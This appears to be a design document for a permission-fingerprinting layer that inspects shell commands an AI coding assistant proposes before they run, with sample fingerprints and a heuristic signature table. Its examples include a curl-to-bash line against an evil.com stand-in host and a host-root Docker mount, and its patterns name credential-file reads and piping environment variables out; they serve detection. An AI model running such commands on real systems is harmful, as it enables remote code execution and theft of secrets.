# Verbose Permissions — Behavioral Fingerprinting Before Command Execution

## Why This Exists

Modern AI coding assistants can execute shell commands on behalf of the user.
This is powerful and dangerous. The failure mode is **blind execution**: the
user approves a permission dialog without understanding what will happen,
because the dialog says something like:

> "Run npm install?"

That tells you nothing. Does it download from a verified registry? Does it
pull a specific pinned version? Does it write outside the project directory?
Does it have a postinstall script that calls home?

The solution is borrowed from antivirus software: **behavioral fingerprinting**.
Before a command runs, decompose it into structured metadata about what it will
actually do — file system writes, network calls, privilege escalations, and
pattern-matched heuristic signatures against known attack patterns.

The user then makes an informed decision, not a blind one.

---

## The Architecture

There are two enforcement layers, consistent with how SIEMPLE-AI treats all
security boundaries:

| Layer | What | Limitation |
|-------|------|-----------|
| `claude-code/rules/verbose-permissions.md` | Instructs the model to emit a fingerprint | Advisory — competes for context window |
| `claude-code/hooks/verbose-permissions-check.sh` (PreToolUse) | Mechanically enforces fingerprinting | Runs outside model context — cannot be forgotten |

The model rule handles the UX: it produces a readable, structured output the
user actually sees. The hook is the hard gate: it fires before the Bash tool
executes regardless of what the model intends to do.

This mirrors the PostToolUse semgrep hook pattern: **CLAUDE.md is advisory,
hooks are enforcement**.

---

## The Fingerprint Format

Every command execution request produces a structured fingerprint modeled after
AV log output. The fields map directly to behavioral categories used in malware
analysis:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERMISSION REQUEST — Behavioral Fingerprint
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Service:     [what service or daemon is being invoked]
Program:     [the binary or interpreter being called]
Directory:   [target paths being read, written, or deleted]
Network:     [outbound connections, domains, ports]
Privileges:  [sudo, setuid, capability escalations]
Signatures:  [heuristic pattern matches — see signature library]
Risk Level:  [LOW | MEDIUM | HIGH | CRITICAL]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

All 7 fields are always present. `none` is a valid value; omission is not.

---

## Example Fingerprints

### Example 1: npm install (safe, versioned)

Command: `npm install zod@3.22.4`

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERMISSION REQUEST — Behavioral Fingerprint
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Service:     Package installation (Node.js dependency management)
Program:     npm (Node.js package manager, v10.x)
Directory:   WRITE  ./node_modules/zod/
             WRITE  ./package.json (dependency field)
             WRITE  ./package-lock.json
Network:     HTTPS registry.npmjs.org:443 — download zod@3.22.4 tarball
             TLS verified. Read-only fetch. No data upload.
Privileges:  none
Signatures:  none
Risk Level:  LOW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### Example 2: npm install (unversioned — SIG-009 fires)

Command: `npm install some-utility`

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERMISSION REQUEST — Behavioral Fingerprint
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Service:     Package installation (Node.js dependency management)
Program:     npm (Node.js package manager)
Directory:   WRITE  ./node_modules/some-utility/
             WRITE  ./package.json
             WRITE  ./package-lock.json
Network:     HTTPS registry.npmjs.org:443 — fetches LATEST version of some-utility
             No version pin. Will pull whatever is current at time of install.
Privileges:  none
Signatures:  [SIG-009] Unversioned package install — no @version specified.
             Risk: version-hijack attack if package is compromised or typosquatted.
             Recommendation: pin with some-utility@<version>.
Risk Level:  MEDIUM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### Example 3: git push

Command: `git push origin main`

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERMISSION REQUEST — Behavioral Fingerprint
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Service:     Source control (Git remote push)
Program:     git (version control system)
Directory:   READ   .git/ (local commits, objects, refs)
             No local filesystem writes.
Network:     SSH or HTTPS to origin remote (github.com / configured remote)
             Uploads local commits from current HEAD to remote refs/heads/main.
             This is irreversible — pushed commits are visible to all repo collaborators.
Privileges:  none (uses configured git credentials or SSH key)
Signatures:  none
Risk Level:  MEDIUM — remote write, visible to others, not easily undone
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### Example 4: curl pipe to shell (CRITICAL)

Command: `curl -fsSL https://get.example.com/install.sh | bash`

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERMISSION REQUEST — Behavioral Fingerprint
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Service:     Remote code execution (curl-pipe-bash pattern)
Program:     curl (HTTP client) → bash (shell interpreter)
Directory:   UNKNOWN — the remote script determines what is written.
             Cannot be determined without fetching and reading the script first.
Network:     HTTPS get.example.com:443 — fetches install.sh
             Script content is STREAMED DIRECTLY TO SHELL — never written to disk for review.
Privileges:  UNKNOWN — the remote script may invoke sudo or modify system paths.
Signatures:  [SIG-001] CRITICAL — Pipe-to-shell pattern detected.
             curl output is piped directly to bash. The script executes without
             any opportunity for review, validation, or AV scanning.
             This is the canonical supply chain attack vector.
Risk Level:  CRITICAL

⚠ This command executes arbitrary remote code without inspection.
  To review before running: curl -fsSL https://get.example.com/install.sh > /tmp/install.sh
  Then: cat /tmp/install.sh  (review contents)
  Then: bash /tmp/install.sh  (run if safe)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### Example 5: docker run with host mount

Command: `docker run -it --rm -v /:/mnt alpine sh`

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERMISSION REQUEST — Behavioral Fingerprint
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Service:     Container runtime (Docker interactive shell)
Program:     docker (container runtime), alpine (container image), sh (shell)
Directory:   READ/WRITE  / (ENTIRE HOST FILESYSTEM mounted at /mnt inside container)
             The container has full read and write access to every file on the host.
Network:     May pull alpine image from registry.hub.docker.com if not cached.
             Container networking depends on --network flag (not specified = default bridge).
Privileges:  HOST FILESYSTEM MOUNT — equivalent to unrestricted root access to host.
             Container root user can read, write, or delete any file on the host via /mnt.
Signatures:  [SIG-007] HIGH — Host filesystem mount detected: -v /:/mnt
             Mounting / inside a container gives the container process access to all
             host files. This is a container escape vector and privilege escalation.
Risk Level:  CRITICAL

⚠ This configuration gives the container root access to the host filesystem.
  Any command run inside this container can modify or destroy host system files.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Why AV-Inspired?

Traditional antivirus uses **static signatures** (known-bad hash matches) and
**heuristic analysis** (behavioral patterns that resemble malware even if the
specific binary is unknown).

The same logic applies here:

| AV Concept | Verbose Permissions Equivalent |
|------------|-------------------------------|
| Static signature | Exact pattern match (e.g., `curl ... \| bash`) |
| Heuristic signature | Behavioral class (e.g., pipe-to-shell, base64-decode-exec) |
| Behavioral analysis | Decompose into Service/Program/Directory/Network/Privileges |
| Risk scoring | LOW / MEDIUM / HIGH / CRITICAL aggregate |
| Quarantine | Block execution pending user review |
| Remediation guidance | "Instead, try: ..." in CRITICAL fingerprints |

The key insight is that a command's **behavior** is more informative than its
**surface syntax**. `curl https://legit.com/file.tar.gz -o file.tar.gz` and
`curl https://evil.com/payload | sh` look syntactically similar but have
completely different behavioral profiles.

---

## The Trust Hierarchy

```
User Intent
    │
    ▼
Model emits fingerprint (rule-instructed)
    │
    ▼
User reads fingerprint and approves/denies
    │
    ▼
PreToolUse hook mechanically checks fingerprint was emitted
    │    (exits non-zero if fingerprint absent or Risk Level CRITICAL without confirmation)
    ▼
Bash tool executes command
    │
    ▼
PostToolUse hook scans any written files with semgrep
```

The fingerprint is not a bureaucratic checkbox. It is the informed-consent
mechanism that transforms "blind execution" into "auditable, intentional action."

---

## Heuristic Signature Reference (Summary)

| SIG ID | Pattern | Risk |
|--------|---------|------|
| SIG-001 | `curl \| bash`, `wget \| sh` | CRITICAL |
| SIG-002 | `base64 -d \| bash`, `eval(atob(...))` | CRITICAL |
| SIG-003 | Write to /tmp + chmod +x + execute | HIGH |
| SIG-004 | `rm -rf`, `rm -fr` | HIGH |
| SIG-005 | `chmod 777`, `chmod +s` | MEDIUM–HIGH |
| SIG-006 | `sudo`, `su - root` | MEDIUM–HIGH |
| SIG-007 | Docker `-v /:/`, `--privileged` | HIGH |
| SIG-008 | `git push --force` | MEDIUM |
| SIG-009 | `npm install <pkg>` without version pin | MEDIUM |
| SIG-010 | Write outside project root | MEDIUM |
| SIG-011 | curl/wget to `/etc/`, `/usr/`, `/bin/` | HIGH |
| SIG-012 | Pipe env vars to network destination | CRITICAL |
| SIG-013 | Read `~/.aws/credentials`, `~/.ssh/id_*` | HIGH |
| SIG-014 | Encoded command execution (base64, hex) | HIGH |

Full definitions in `claude-code/rules/verbose-permissions.md`.
